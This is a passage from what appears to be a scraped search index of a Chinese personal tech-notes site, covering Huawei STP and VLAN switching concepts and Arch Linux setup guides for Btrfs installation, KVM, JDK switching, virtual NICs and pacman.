桥ID具体示意 从高位比较再到低位；值越小越优先。（选值4096的倍数） 端口ID具体示意 从高位比较再到低位；值越小越优先（端口编号与实际接口无关，选值16的倍数） 路径开销示意 （98年制定的旧链路开销标准，现在链路的带宽都不止10G，在计算带宽时存在不合理） （华为设备现在所支持的链路开销标准802.1t，使用链路聚合的开销=开销标准/链路数量） 根路径开销示意（由路径开销计算出根路径开销,根桥发出的BPDU开销为0) （从根桥发出的开销为0，在根据自己所有收到的接口到根桥的开销相加，取最小的开销值，就是根路径开销） STP选举过程：（在STP中优先级是越小越好） BID最小的成为根桥（先比较优先级再比较交换机Mac地址） （开始都会发送BPDU，在收到与自己的参数比较，然后清楚自己的角色） （先看RPC再看对端BID，然后比较对端PID，最后比较本地PID） （在每条链路上选举一个指定端口负责数据的收发，“根路径开销”是比较端口的RPC越小越好，所以根桥的端口都是0，为指定端口//当拿一根线插在同一个根桥时，根桥的端口会比较到PID，就不会都是指定端口，其中一个为预备端口状态变成阻塞） 剩下的端口就是预备端口状态为阻塞 STP的端口状态： STP端口状态 接收BPDU 转发BPDU 学习MAC 转发数据 过渡状态 稳定状态 Disabled禁用 × × × × × √ Blocking阻塞 √ × × × × √ Listening监听 √ √ × × √ × Learning学习 √ √ √ × √ × Forwarding转发 √ √ √ √ × √ 1.禁用 disable 未开启STP协议 2.阻塞 blocking 接收BPDU 3.侦听 listening 接收BPDU 转发BPDU 4.学习 learning 接收BPDU 转发BPDU 学习MAC地址 5.转发 forwarding 接收BPDU 转发BPDU 学习MAC地址 转发用户流量 注：华为交换机默认显示RSTP状态，附RSTP状态与STP端口状态对比 STP的计数器： 计时器 备注 Hello 2s，根桥发送BPDU的间隔 Forwarding Delay转发延时 15s，监听和学习的持续实际（监听到学习需要15S，学习到转发需要15s） MSG Age 当前的年龄，每经过一个设备就加1（从根桥开始为0往下算），最大为20，超过20则丢弃.（不建议接太多设备影响交换机性能） Max Age 20s，保持阻塞的最大时间（每2秒收到一次，通过比较最后阻塞，若20秒没收到就不再阻塞） 一个预备端口从阻塞状态到转发状态的时间：50S MSG Age STP的端口状态转换： STP拓扑变化： 根桥故障需要等待50S，网络才会恢复正常（20S老化时间和30S变成转发状态） （SWB检测到自己的根端口与根桥断了，立马将预备端口从阻塞状态变成转发状态，需要经过2个forwarding delay阻塞——15s监听——15s转发）这个过程需要30s （当SWB发生设备故障后，会发出我是根桥的BPDU，SWC收到2个对端发来的BPDU经过比较发现并不是最优的，接收但不会改变该角色，等到老化时间才会改变角色状态）这个过程需要50s 拓扑改变导致MAC地址表错误 MAC地址表老化太长，链路角色变换，但是MAC地址还是原来（要么等待300S或ARP老化） 解决方法： 检测到拓扑变化的交换机通过根端口向根桥发TCN，步骤1 上游交换机收到TCN后回应TCA，让下游交换机停止发送TCN，步骤2 再通过根端口发送TCN直到根桥收到，步骤3 根桥通过指定端口发送TC通知所有下游交换机把MAC地址表的老化时间300秒变成15秒。步骤4，5 BPDU字段中的Flags中： 1000 0000最高位为1作为TCA 0000 0001最低位为1作为TC STP的配置 命令 备注 stp mode {mstp \\ stp \\ rstp} 调整STP的模式，默认MSTP stp priority 4096 调整BID优先级值，0~61440，步长为4096的倍数 stp root primary / secondary 自动修改优先级，指定主/备根桥 stp pathcost-standard{ dot1d-1998 \\ dot1t \\ legacy } 配置计算路径开销值得标准 开销标准： legacy标准：cost=1~200000，华为私有802.1d标准：cost=1~65535802.1t标准：cost=1~200000000，默认 stp cost 10 修改STP开销 stp port priority 144 修改PID优先级，0~240，步长为16的倍数 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:16 "},"1.网络技术/5.交换/VLAN.html":{"url":"1.网络技术/5.交换/VLAN.html","title":"VLAN","keywords":"","body":" VLAN技术背景： 划分VLAN，将广播域范围减小 VLAN优点： 有效控制广播域范围 增强局域网的安全性 灵活构建虚拟工作组 简化网络管理 VLAN概述：Virtual LAN 虚拟局域网 将一个物理局域网在逻辑上划分成多个广播域 1 VLAN = 1 广播域 = 1 子网 （划分最好一个子网一个VLAN） 广播不会在不同VLAN间转发，而是限制在相同的VLAN中 不同VLAN间的设备默认无法通信 VLAN范围：0~4095 （0和4095保留，1为默认） VLAN划分：基于端口最常见 VLAN标签介绍： IEEE 802.1q：又称dot1q，是VLAN的正式标准，对Ethernet帧格式进行修改，在源Mac地址字段和协议类型字段中插入了4字节的802.1q Tag 每台支持802.1q协议的交换机发送的数据帧都会包含VLAN ID，以指明数据帧属于哪一个VLAN。因此，在一个VLAN交换网络中，以太网帧有以下两种格式 无标记帧（untagged frame） 原始的数据帧，未加入4字节802.1q tag的字段 有标记帧（tagged frame） 插入了4字节802.1q tag的字段 路由器和终端设备发送的数据帧默认是untagged frame，默认也识别不了tagged frame VLAN链路类型： 类型 备注 Access Link 接入链路 一般用于连接主机或路由器之间的链路接入链路上传输的帧都是untagged帧 Trunk Link干道/中继链路 一般用于交换机间的互连或交换机与路由器之间的链路干道链路上传输的帧几乎都是tagged帧用于两端识别 PVID：Port Vlan identification 端口缺省VLAN 指明该接口属于的VLAN VLAN端口类型： 类型 备注 Untagged 未打标签 Tagged 打标签 Access接入端口 用于连接主机收到数据后会添加VLAN Tag，VLAN ID和端口的PVID相同转发数据前会移除VLAN Tag注意：终端设备（PC）发出和接收的都是untagged的帧，否则无法识别 图例主机AC属于一个VLAN，B属于另一个VLAN,A与C相互通讯的演示 Trunk干道端口 用于连接交换机或路由器收到帧时：如果该帧不包含Tag，将打上端口的PVID；如果该帧包含Tag，则不改变。发送帧时：首先要保证该帧的VLAN ID在Trunk的允许发送列表中（华为默认只允许VLAN1，思科默认允许所有VLAN)若与端口的PVID相同时，则剥离Tag发送；若与端口的PVID不同时，则直接发送。 图例主机A与C通信，主机B与D通信 Hybrid混杂端口 既可以连接主机，又可以连接其他交换机。既可以连接接入链路又可以连接干道链路。允许多个VLAN的帧通过，并可以在出接口方向将某些VLAN帧的Tag剥离掉（由命令决定） 图例主机A与主机B不能相互访问，但都可以访问PVID100的服务器 交换机之间的g0/0/1口可以打标签也可以不打标签，打标签就是Trunk模式，不打就是Acess模式 即 port hybrid tagged vlan 2 3 100这条命令可以不写 Access端口白话解释： 交换机每个接口有PVID，默认PVID=1，可以修改。 当接口为Access模式时： 收到未打标签（untagged）的帧会添加接口的PVID 收到打标签（tagged）的帧会直接修改为tagged帧的VLAN Tag 发帧时统一剥离VLAN Tag（Untagged）并与发送接口的PVID比较，一致转发不一致丢弃 Trunk端口白话解释： 交换机每个接口有PVID，默认PVID=1，可以修改。 接口为Trunk模式时： 收到未打标签的帧，将打上端口的PVID（和access模式一样） 收到打标签的帧，则不改变直接转发 发送帧时，先检查该帧VLAN ID在Trunk的允许发送列表 若发送的帧与端口的PVID相同，剥离Tag发送；（和access模式一样） 若与端口的PVID不同时，则直接发送。 Hybrid端口白话解释：（华为私有接口） 交换机每个接口有PVID，默认PVID=1，可以修改。 可以任意指定数据帧发送或接收是否携带tagged 接口属于混杂模式，既可以是Trunk又可以是Acess 收帧时既可以打上标签（Access），也可以直接转发带标签的帧（Trunk） 发帧时既可以直接转发带标签的帧（Trunk），也可以剥离标签（Acess） 交换机判断VLAN的逻辑： VLAN配置： 命令 备注 vlan 10 创建单个VLAN vlan batch 10 to 20 创建多个VLAN port link-type accessport link-type trunkport link-type hybrid 配置接口类型简写为P L A、P L T、P L H port default vlan 10 配置access关联的VLAN/PVID,简写 P D V 10 port trunk allow-pass vlan 10 配置Trunk允许通过的VLAN，简写P L A V 10华为默认只允许VLAN1 port trunk pvid vlan 10 配置Trunk的PVID port hybrid tagged vlan 10port hybrid untagged vlan 10 配置Hybird标记VLAN（标记和剥离） port hybrid pvid vlan 10 配置Hybird的PVID display vlan 验证VLAN display port vlan 10 验证VLAN 交换机的工作原理： VLAN间路由 VLAN间通信限制：每一个VLAN都是独立的广播域，不同VLAN之间隔离，因此不同VLAN的节点之间是无法直接访问 VLAN间通信方法（路由）： 使用路由器完成不同VLAN通信 （缺点：每一个VLAN就需要绑定一个物理接口） 使用一个接口的子接口（虚拟接口），来绑定VLAN大大减少了资源消耗 交换机设置为Trunk，路由器如何识别VLAN？ dot1q termination vid 10 作用：该子接口与VLAN10绑定，收到VLAN10就剥离VLAN，查看路由表执行路由转发，转发在打上转发接口的PVID 路由器一般用作出口设备（广播域太大），且价格较贵，使用路由器实现VLAN间通信不经济 使用具有路由功能的交换机实现VLAN间通信 VLAN配置： 命令 备注 Vlan 10 创建单个VLAN Vlan batch 10 20 创建多个VLAN Port link-type access/trunk/hybrid 配置接口类型 Port default vlan 10 配置access关联VLAN/PVID Port trunk allow-pass vlan 10 配置trunk允许VLAN通过（默认只允许VLAN1通过） Port trunk pvid vlan 10 配置trunk的PVID Port hybrid tagged/untagged vlan 10 配置hybrid标记VLAN Port hybrid pvid vlan 10 配置hybrid的PVID Display vlan 验证VLAN Display port vlan 验证VLAN Dot1q termination vid 10 子接口和VLAN关联 Arp broadcast enable 开启子接口的ARP广播功能 portswitch 配置接口工作为2层 Undo portswitch 配置接口工作为3层 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:18 "},"1.网络技术/5.交换/交换机的工作原理.html":{"url":"1.网络技术/5.交换/交换机的工作原理.html","title":"交换机的工作原理","keywords":"","body":"交换基础 网络分层设计： 易于理解、学习、排错 层次 备注 接入层Access layer 用户接入 接入安全 访问控制 汇聚层Distribution layer 流量汇聚 链路冗余 设备冗余 路由选择 核心层Core layer 高速转发 服务器接入 路由选择 出口层Speak layer 广域网接入 出口策略 带宽控制 对层次的带宽要求几何增长 对层次的设备性能要求集合增长 交换机的主要功能： 交换机根据MAC地址来转发数据帧 交换机的工作原理：根据MAC地址表中的MAC地址表项，做出智能转发 原理 备注 学习 Learn 从一个接口收到数据帧时，把数据帧的源MAC地址和该接口进行绑定，存放MAC地址表 泛洪Flood 从一个接口收到广播帧、组播帧、未知单播帧，把该帧从其他所有接口转发出去（除接收口） 转发Forward 从一个接口收到已知单播帧，立即从相应的接口转发出去（除目标地址是自己） 更新Update 交换机地址表中的表项默认的保存300秒交换机重启会清空所有接口学习到的记录接口关闭后会清空该接口学习到的记录一个源MAC地址出现在别的接口上，会删除老的记录，添加新的记录 注： 对应一台交换机来说：一个MAC地址只能关联一个接口上一个接口可以存在多个MAC地址 以太网接口工作模式： 术语 备注 半双工 half-duplex通信双方不能同时发送接收数据 全双工 full-duplex通信双方可以同时发送接收数据 速率 Speed接口两端连接时进行协商，协商失败无法正常通信 可以设置两端的通信模式默认是自动（选取两端设备的最低值） 网络速度无其他因素影响，但网速很慢可能是半双工模式 电脑设置通信模式： 交换机设置通信模式： 术语 备注 undo negotiation auto 取消自动协商 speed 100 设置速率 duplex full 设置通信模式为全双工 duplex half 设置通信模式为半双工 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:13 "},"2.系统运维/Arch任务栏后台应用没有图标.html":{"url":"2.系统运维/Arch任务栏后台应用没有图标.html","title":"Arch任务栏后台应用没有图标","keywords":"","body":"在目录 /usr/share/applications 或 ~/.local/share/applications 添加 mendeley.desktop 注意icon=xxx/xxx.png 这一行，可从google image等下载相应图标，放到某一路径。如不正确，则在Show Application 中没有图标。 注意 StartupWMClass=xxx 这一行，可用命令 xprop WM_CLASS， 再点击目标应用mendeley窗口，可获得相应类别，如不正确，可能导致taskbar 上的应用没有图标。参考ubuntu: icon miss when application is launched [Desktop Entry] Version=1.0 Type=Application Name=Mendeley Reference Manager GenericName=Mendeley Reference Manager Comment=mendeley reference manager StartupWMClass=Mendeley Reference Manager TryExec=mendeley Exec=mendeley Icon=/home/xxx/.local/share/icons/hicolor/48x48/mimetypes/mendeley.png Categories=Tools; 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:55 "},"2.系统运维/Arch创建虚拟网卡.html":{"url":"2.系统运维/Arch创建虚拟网卡.html","title":"Arch创建虚拟网卡","keywords":"","body":"创建虚拟网卡： >$ sudo ip link add dev virnet0 type veth 其中 virnet0 是虚拟网卡的名字，可以换成你喜欢的名字。 接下来为虚拟网卡配置IP地址： >$ sudo ip addr add 192.168.20.1/24 dev virnet0 激活虚拟网卡，以下两条命令使用任意一条均可： >$ sudo ip link set virnet0 up >$ sudo ifconfig virnet0 up 现在虚拟网卡已经激活了，可以查看它的状态了： >$ sudo ip link show virnet0 7: virnet0@veth0: mtu 1500 qdisc noqueue state LOWERLAYERDOWN mode DEFAULT group default qlen 1000 link/ether 7e:5e:f0:ca:c9:74 brd ff:ff:ff:ff:ff:ff 当然也可以用 ifconfig 查看状态： >$ ifconfig virnet0 virnet0: flags=4099 mtu 1500 inet 192.168.99.2 netmask 255.255.255.0 broadcast 0.0.0.0 ether 7e:5e:f0:ca:c9:74 txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 停用虚拟网卡，同样是以下两条命令任选其一： >$ sudo ip link set virnet0 down >$ sudo ifconfig virnet0 down 此时再查看虚拟网卡的状态，发现已经是 down 的状态了： >$ sudo ip link show virnet0 7: virnet0@veth0: mtu 1500 qdisc noqueue state LOWERLAYERDOWN mode DEFAULT group default qlen 1000 link/ether 7e:5e:f0:ca:c9:74 brd ff:ff:ff:ff:ff:ff 删除虚拟网卡： >$ sudo ip link delete dev virnet0 再次查看虚拟网卡的状态，会提示该设备不存在： >$ sudo ip link show virnet0 Device \"virnet0\" does not exist. 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:48 "},"2.系统运维/Arch双显卡驱动安装.html":{"url":"2.系统运维/Arch双显卡驱动安装.html","title":"Arch双显卡驱动安装","keywords":"","body":"集成显卡 通过以下命令安装如下几个包即可： sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:55 "},"2.系统运维/Arch多版本JDK共存以及切换.html":{"url":"2.系统运维/Arch多版本JDK共存以及切换.html","title":"Arch多版本JDK共存以及切换","keywords":"","body":"ArchLinux提供了archlinux-java命令来切换jdk版本，使用如下： 使用ArchLinux的包管理器安装openjdk8和openjdk11 $ sudo pacman -S jdk8-openjdk jdk11-openjdk 使用archlinux-java切换默认jdk版本 # 查看archlinux-java使用说明 $ archlinux-java --help # 查看jdk状态 $ archlinux-java status Available Java environments: java-11-openjdk java-8-openjdk (default) # 获取默认jdk $ archlinux-java get java-8-openjdk # 设置默认jdk $ sudo archlinux-java set java-11-openjdk # 查看切换后的jdk版本 $ java -version openjdk version \"11.0.13\" 2021-10-19 OpenJDK Runtime Environment (build 11.0.13+8) OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode) 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:49 "},"2.系统运维/Arch安装Btrfs文件系统.html":{"url":"2.系统运维/Arch安装Btrfs文件系统.html","title":"Arch安装Btrfs文件系统","keywords":"","body":" 文章来源： https://sspai.com/post/78916 https://blog.zrlab.org/posts/arch-btrfs/ https://www.hhhil.com/posts/archlinux-btrfs-scheme/#%e5%b8%83%e7%bd%ae 按照自己电脑配置需求做出细微更改 重装前的备份（选做） 运行 pacman -Qe >> list.txt 可以将列出系统中所有手动指定安装的包名单保存到 list.txt 文件里面，方便重装后参照这个名单将软件装回来。 备份整个家目录，找一个闲置的空的移动硬盘，将其挂载在 /mnt 目录下，并新建一个空文件夹 arch_backup。为了在恢复数据时保留所有文件的权限，我使用 rsync 命令： sudo rsync -avrh --progress /home/ /mnt/arch_backup/ 若你在根分区也有想要备份的文件，也可以选择备份。 系统安装 手动编辑 /etc/pacman.d/mirrorlist 将国内镜像列表移动到最顶部，直接在文件最开头手动添加国内镜像源，以北外镜像站为例，在文件最开头添加这样一行： Server = https://mirrors.bfsu.edu.cn/archlinux/$repo/os/$arch 硬盘分区 建立分区 使用cfdisk分区 cfdisk /dev/nvme0n1 分区完成后，使用 fdisk 或 lsblk 命令复查分区情况： fdisk -l # 复查磁盘情况 or lsblk 格式化分区 EFI : 如果目标是双系统（Win10/Win11 + Arch Linux），并且 Win10/Win11 和 Arch Linux 将要共存在一个硬盘上的话，不要重新格式化原有的 EFI 分区，因为它可能包含启动其他操作系统所需的文件。 mkfs.fat -F32 /dev/nvme0n1p1 Btrfs : mkfs.btrfs -L ArchLinux /dev/nvme0n1p7 Swap : mkswap /dev/nvme0n1p6 建立Btrfs子卷 @：对应 / @home：对应 /home @pacman：对应 /var/cache/pacman @docker：对应/var/lib/docker @libvirt：对应/var/lib/libvirt @log：对应 /var/log 其中 @pacman，@log不使用写时复制 然后是挂载分区，btrfs 分区的挂载比较复杂，首先挂载整个 btrfs 分区到 /mnt，这样才可以创建子卷： mount -t btrfs -o compress=zstd /dev/nvme0n1p7 /mnt # 挂载分区 # 创建子卷 btrfs subvolume create /mnt/@ btrfs subvolume create /mnt/@home btrfs subvolume create /mnt/@pacman btrfs subvolume create /mnt/@docker btrfs subvolume create /mnt/@libvirt btrfs subvolume create /mnt/@log # 使用 chattr 忽略无需写时复制的目录 chattr +C /mnt/@pacman chattr +C /mnt/@log # 取消分区挂载，以便挂载子卷 umount /mnt or umount /dev/nvme0n1p7 # 卸载分区 关于子卷的划分，我打算使用 Timeshift 来管理快照，而 Timeshift 只支持 Ubuntu 类型的子卷布局，也就是根目录挂载在 @ 子卷上，/home 目录挂载在 @home 子卷上； 另外我还打算使用 grub-btrfs 来为快照自动创建 grub 目录，grub-btrfs 要求/var/log挂载在单独的子卷上； 还有 @pkg 子卷挂载在 /var/cache/pacman/pkg 目录下，这个目录下保存的是下载的软件包缓存，也没什么保存快照的必要，所以也单独划分了个子卷。 挂载子卷 接下来就是挂载子卷了，使用 subvol 挂载选项来指定挂载的子卷： # 创建挂载目录 mkdir -p /mnt/{home,var/{log,lib/docker,lib/libvirt,cache/pacman}} mkdir -p /mnt/var/cache/pacman # 挂载根目录 mount -o subvol=@,discard=async,ssd,compress=zstd /dev/nvme0n1p7 /mnt # 挂载家目录 mount -o subvol=@home,discard=async,ssd,compress=zstd /dev/nvme0n1p7 /mnt/home # 挂载 /var/lib/docker 目录 mount -o subvol=@docker,discard=async,ssd,compress=zstd /dev/nvme0n1p7 /mnt/var/lib/docker # 挂载 /var/lib/libvirt 目录 mount -o subvol=@libvirt,discard=async,ssd,compress=zstd /dev/nvme0n1p7 /mnt/var/lib/libvirt # 挂载 /var/cache/pacman 目录 mount -o subvol=@pacman,discard=async,ssd,compress=zstd /dev/nvme0n1p7 /mnt/var/cache/pacman # 挂载 /var/log 目录 mount -o subvol=@log,discard=async,ssd,compress=zstd /dev/nvme0n1p7 /mnt/var/log # 挂载 boot 分区 mkdir /mnt/boot mount /dev/nvme0n1p1 /mnt/boot # 启用 swap 分区 swapon /dev/nvme0n1p6 subvol ：指定挂载的子卷； noatime 选项可以降低数据读取和写入的访问时间； discard=async 选项可以在闲时释放磁盘中未使用的区块，也就是 TRIM； compress 选项可以在数据写入前进行压缩，减少磁盘的写入量，增加磁盘寿命，在某些场景下还能优化一些性能； Btrfs 压缩算法： 截至撰写本文时，Btrfs 文件系统支持以下压缩算法： i) LZO： LZO是一种无损实时块压缩算法。 LZO将数据分成块，并实时按块压缩/解压缩数据。它是 Btrfs 文件系统的默认压缩算法。 ii) ZLIB： ZLIB 是一个用于数据压缩的库。它使用 DEFLATE 数据压缩算法。 DEFLATE数据压缩算法是LZ77和Huffman编码算法的组合。 Btrfs 文件系统支持 ZLIB 数据压缩算法。 您还可以指定所需的压缩级别。级别可以是从 1 到 9 之间的任意数字。级别越高表示压缩比越高。因此，级别 9 将比级别 1 节省更多的磁盘空间（级别 9 的压缩比比级别 1 更高）。除非您指定要使用的 ZLIB 压缩级别，否则 Btrfs 文件系统将默认使用 ZLIB 压缩级别 3。 iii)ZSTD：ZSTD或Zstandard是一种高性能无损数据压缩算法。它是由 Yann Collect 在 Facebook 开发的。它的压缩率与 ZLIB 中使用的 DEFLATE 算法相当，但速度更快。 Btrfs 文件系统支持 ZSTD 数据压缩算法。 您还可以指定所需的压缩级别。级别可以是从 1 到 15 之间的任意数字。级别越高表示压缩比越高。因此，级别 15 将比级别 1 节省更多的磁盘空间（级别 15 的压缩比比级别 1 更高）。除非您指定要使用的 ZSTD 压缩级别，否则 Btrfs 文件系统将默认使用 ZSTD 压缩级别 3。 接下来便可以继续接下来的安装步骤了。 安装Arch 使用 pacstrap 命令，我一般会在这个步骤装上如下的软件包： pacstrap -K /mnt base base-devel linux-lts linux-lts-headers linux-firmware grub efibootmgr efivar btrfs-progs intel-ucode os-prober openssh net-tools networkmanager iwd vim wget zsh base 和 base-devel：系统核心的软件包组 linux-lts 和 linux-lts-headers：长期支持版本的内核及其头文件 linux-firmware：包含各种常用的驱动 intel-ucode：用于 intel 处理器的微码文件 os-prober：用于Arch后续安装GURB时能识别双系统中的Windows networkmanager：网络管理器，用于启动网络 net-tools：包含ifconfig等常见网络命令 生成 fstab 文件​ fstab 用来定义磁盘分区。它是 Linux 系统中重要的文件之一。使用 genfstab 自动根据当前挂载情况生成并写入 fstab 文件： genfstab -U /mnt > /mnt/etc/fstab 复查一下 /mnt/etc/fstab 确保没有错误： 进入系统 Change Root 使用以下命令把系统环境切换到新系统下： arch-chroot /mnt 提前加载 btrfs 在 chroot 进入新系统后，除了官方推荐的配置，对于 btrfs 文件系统，需要编辑 mkinitcpio 文件； 编辑/etc/mkinitcpio.conf，找到 MODULES=() 一行，在括号中添加 btrfs； 这是为了在系统启动时提前加载 btrfs 内核模块，从而正常启动系统； vim /etc/mkinitcpio.conf # dd `MODULES=()` MODULES=(btrfs) 每次编辑完 mkinitcpio 文件后都需要手动重新生成 initramfs mkinitcpio -P 安装 GRUB UEFI + GPT pacman -S grub efibootmgr os-prober grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch grub-mkconfig -o /boot/grub/grub.cfg 编辑 /etc/default/grub 文件（Windows + Arch 双系统）： 为了引导 win10，则还需要添加新的一行 GRUB_DISABLE_OS_PROBER=false vim /etc/default/grub 最后生成 GRUB 所需的配置文件： grub-mkconfig -o /boot/grub/grub.cfg 安装后的配置 添加新用户 useradd -m -G wheel -s /bin/bash username 这个命令添加了一个用户组为 wheel，默认shell 为 bash，用户名为 username 的新用户，如果之后打算恢复以前的家目录，建议使用和之前系统一样的用户名。 运行chmod +w /etc/sudoers给文件添加写权限 (默认无法写入)，在使用vim编辑器，找到 # %wheel ALL=(ALL:ALL) 一行，删除最前面的井号注释，这样所有在 wheel 用户组的用户都可以使用 sudo 命令了，或者要是不想每次运行 sudo 都要输入密码，可以取消注释 %wheel ALL=(ALL:ALL) NOPASSWD: ALL 这一行，但这样可能会降低系统的安全性。 编辑完成后记得chmod -w /etc/sudoers恢复文件权限，否则会有提示警告 备份恢复（选做） 重启进入新系统后，会进入 tty，开始着手恢复家目录文件，将之前用于备份家目录的移动硬盘重新挂载到 /mnt 目录，一样使用 rsync 恢复文件，只需将之前备份命令里两个路径互换位置即可： rsync -avrh --progress /mnt/backup/ /home/ 恢复过程需要较长时间，恢复完成后退出 root 登录，使用普通用户登录。参照之前备份的软件包列表将所需的软件包装回来，再启用一些需要的服务，就可以正常使用了，就和重装前一样。 设置时区 设置上海为时区，并同步硬件时钟 ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # 同步硬件时钟 hwclock --systohc 设置 Locale Locale 决定了软件使用的语言、书写习惯和字符集。 编辑 /etc/locale.gen，去掉 en_US.UTF-8 UTF-8 以及 zh_CN.UTF-8 UTF-8 行前的注释符号（#）： vim /etc/locale.gen 然后使用如下命令生成 locale： locale-gen 向 /etc/locale.conf 输入内容： # echo 'LANG=en_US.UTF-8' > /etc/locale.conf echo 'LANG=zh_CN.UTF-8' > /etc/locale.conf 完成安装 输入以下命令： exit # 退回安装环境 umount -R /mnt # 卸载新分区 reboot # 重启 后记 Windows + Arch双系统时间不一致 原因分析 GMT：Greenwich Mean Time，即格林尼治标准时间，也就是世界时。GMT 以地球自转为基础的时间计量系统，但由于地球自转不均匀，导致 GMT 不精确，现在已经不再作为世界标准时间使用。 UTC：Universal Time Coordinated，即协调世界时。UTC 是以原子时秒长为基础，在时刻上尽量接近于 GMT 的一种时间计量系统。为确保 UTC 与 GMT 相差不会超过 0.9 秒，在有需要的情况下会在 UTC 内加上正或负闰秒。UTC 现在作为世界标准时间使用。 RTC：Real-Time Clock，即实时时钟，在计算机领域作为硬件时钟的简称。 Windows 与 Linux 看待硬件时间的方式不同。Windows 把电脑的硬件时钟（RTC）看成是本地时间，即 RTC = Local Time，Windows 会直接显示硬件时间；而 Linux 则是把电脑的硬件时钟看成 UTC 时间，即 RTC = UTC，那么 Linux 显示的时间就是硬件时间加上时区。 修改 Windows 硬件时钟为 UTC 时间 以管理员身份打开 「PowerShell」，输入以下命令： Reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1 或者打开「注册表编辑器」，定位到 计算机\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation 目录下，新建一个 DWORD 类型，名称为 RealTimeIsUniversal 的键，并修改键值为 1 即可。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:48 "},"2.系统运维/Arch安装KVM.html":{"url":"2.系统运维/Arch安装KVM.html","title":"Arch安装KVM","keywords":"","body":"安装使用 KVM(Kernel-based Virtual Machine, 即内核级虚拟机) 是一个开源的系统虚拟化模块。 QEMU是个独立的虚拟化解决方案，从这个角度它并不依赖KVM。而KVM是另一套虚拟化解决方案，不过因为这个方案实际上只实现了内核中对处理器（Intel VT）, AMD SVM)虚拟化特性的支持，换言之，它缺乏设备虚拟化以及相应的用户空间管理虚拟机的工具，所以它借用了QEMU的代码并加以精简，连同KVM一起构成了另一个独立的虚拟化解决方案：KVM + QEMU。 要使用起来，需要硬件支持，并且需要加载相应的模块。按以下的步骤去检测安装即可。 sudo pacman -S qemu libvirt ovmf virt-manager dnsmasq bridge-utils openbsd-netcat kvm 负责CPU和内存的虚拟化 qemu 向Guest OS模拟硬件（例如，CPU，网卡，磁盘，等） ovmf 为虚拟机启用UEFI支持 libvirt 提供管理虚拟机和其它虚拟化功能的工具和API virt-manager 是管理虚拟机的GUI 注 : 实际上，这步只需要安装qemu就可以使用虚拟机，但是qemu-kvm接口有些复杂，libvirt和virt-manager让配置和管理虚拟机更便捷。 启动KVM libvirt服务 启用服务并设置开机自启动 sudo systemctl enable libvirtd.service sudo systemctl start libvirtd.service 查看运行状态 systemctl status libvirtd.service 配置普通用户可以使用KVM 打开/etc/libvirt/libvirtd.conf文件进行编辑。 sudo pacman -S vim sudo vim /etc/libvirt/libvirtd.conf 将UNIX域套接字组所有权设置为libvirt（第85行左右） unix_sock_group = \"libvirt\" 为R/W套接字设置UNIX套接字权限（第102行附近） unix_sock_rw_perms = \"0770\" 将当前用户帐户添加到libvirt组 sudo usermod -a -G libvirt $(whoami) newgrp libvirt 重新启动libvirt守护进程。 sudo systemctl restart libvirtd.service 启用嵌套虚拟化（可选） 嵌套虚拟化就是在虚拟机中运行虚拟机。 如图所示，通过启用内核模块为kvm_intel / kvm_amd启用嵌套虚拟化。 一般不会这样搞。 ### Intel Processor ### sudo modprobe -r kvm_intel sudo modprobe kvm_intel nested=1 ### AMD Processor ### sudo modprobe -r kvm_amd sudo modprobe kvm_amd nested=1 要使此配置持久化，请运行： echo \"options kvm-intel nested=1\" | sudo tee /etc/modprobe.d/kvm-intel.conf 确认“嵌套虚拟化”设置为“yes”： ## Intel Processor ### $ systool -m kvm_intel -v | grep nested nested = \"Y\" nested_early_check = \"N\" $ cat /sys/module/kvm_intel/parameters/nested Y ### AMD Processor ### $ systool -m kvm_amd -v | grep nested nested = \"Y\" nested_early_check = \"N\" $ cat /sys/module/kvm_amd/parameters/nested Y 在Arch Linux 上使用KVM 至此，已经在Arch Linux上成功安装了KVM、QEMU和Virt Manager。现在就可以用了。 virt-install --name vmware --memory 8192 --vcpus sockets=2,cores=2,threads=2 --disk device=cdrom,path=/mnt/Windows-D/VirtualMachine/Images/VMware-VMvisor-Installer-201701001-4887370.x86_64.iso --disk path=/mnt/Windows-D/VirtualMachine/KVM/esxi-1.img,size=200,bus=ide --network bridge=virbr1,model=e1000 --noautoconsole --accelerate --hvm --graphics vnc,listen=0.0.0.0,port=20005 --video vga --input tablet,bus=usb --cpu host-passthrough 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:48 "},"2.系统运维/Arch安装卸载软件.html":{"url":"2.系统运维/Arch安装卸载软件.html","title":"Arch安装卸载软件","keywords":"","body":"简介 pacman是arclinux中的软件管理工具，可以直接从网络上的软件仓库下载安装及删除软件，自动处理依赖关系，类似ubuntu中的apt-get。pacman也是widows上msys2默认的软件管理工具。 安装软件 安装软件。也可以同时安装多个包，只需以空格分隔包名即可。 pacman -S 软件名 安装软件，但不重新安装已经是最新的软件。 pacman -S --needed 软件名1 软件名2 安装软件前，先从远程仓库下载软件包数据库(数据库即所有软件列表)。 pacman -Sy 软件名 